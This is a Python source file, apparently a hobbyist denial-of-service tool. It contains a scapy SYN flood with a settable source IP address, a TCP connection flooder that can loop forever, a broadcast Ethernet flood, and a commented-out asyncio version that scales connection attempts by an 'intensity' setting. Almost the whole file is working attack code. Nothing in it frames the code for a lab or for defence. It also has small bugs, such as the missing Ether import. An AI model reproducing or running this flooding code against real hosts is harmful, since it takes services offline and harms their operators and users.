import socket
import time
import asyncio
from scapy.all import IP, TCP, send

def synFlood(src, dst, sport, dport, frames, selectedInterface):
    print("!!DoS is starting!!")
    print(src, dst, sport, dport, frames, selectedInterface)

    for x in range(frames):
        seq = 1234 + x
        ip = IP(src=src, dst=dst)
        SYN = TCP(sport=sport, dport=dport, flags="S", seq=seq)
        send(ip/SYN, iface=selectedInterface)  # send is for layer 3 and handles routing, sendp is for layer 2

def ipConnection(ip, port):
  try:
    # Create a socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
      # Connect to server
      sock.connect((ip, port))
      print(f"Connected to {ip}:{port}")
      return True
    
  except socket.error as e:
    print(f"Connection failed: {e}")
    return False

def ipConnectionFlood(ip, port, connections, delay):
  if connections == 0:
    print("Infinite connection attempts.")
    while True:
      ipConnection(ip, port)
      time.sleep(delay)

  else:
    for connection in range(connections):
      print(f"Attempt {connection + 1} of {connections}")
      if ipConnection(ip, port):
        break
      time.sleep(delay)


def broadcastFlood(frames, selectedInterface):
  for x in range(frames):
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    send(eth, iface=selectedInterface)



#Most functions should have an infinite otion. This can be figured out later
#these functions should have an on off switch.
#probably have to be async or something 



# async def connect_to_ip(ip, port, delay, stop_event, attempt_counter):
#     while not stop_event.is_set():
#         attempt_number = next(attempt_counter)
#         try:
#             reader, writer = await asyncio.open_connection(ip, port)
#             print(f"Connected to {ip}:{port} on attempt {attempt_number}")
#             writer.close()
#             await writer.wait_closed()
#         except Exception as e:
#             print(f"Attempt {attempt_number}: Connection to port {port} failed: {e}")
#         await asyncio.sleep(delay)

# def attempt_counter():
#     count = 1
#     while True:
#         yield count
#         count += 1

# def input_with_validation(prompt, type_=None, min_=None, max_=None, range_=None):
#     while True:
#         try:
#             value = type_(input(prompt))
#             if (min_ is not None and value < min_) or (max_ is not None and value > max_) or (range_ is not None and value not in range_):
#                 raise ValueError
#             return value
#         except ValueError:
#             print(f"Invalid input. Please enter a valid value in the range {range_ if range_ is not None else (min_, max_)}.")

# async def connectDOS(ip_address, ports, attempts, delay, intensity):
#     stop_event = asyncio.Event()
#     counter = attempt_counter()

#     tasks_per_port = 1 if intensity == 0 else (100 if intensity == 5 else max(1, 10 * intensity))
#     tasks = []

#     for port in ports:
#         for _ in range(tasks_per_port):
#             task = asyncio.create_task(connect_to_ip(ip_address, port, delay, stop_event, counter))
#             tasks.append(task)

#     if attempts > 0:
#         await asyncio.sleep(attempts * delay)
#         stop_event.set()

#     try:
#         await asyncio.gather(*tasks)
#     except asyncio.CancelledError:
#         stop_event.set()
#         print("\nProgram interrupted. Closing all connections...")
#     finally:
#         for task in tasks:
#             task.cancel()
#         await asyncio.gather(*tasks, return_exceptions=True)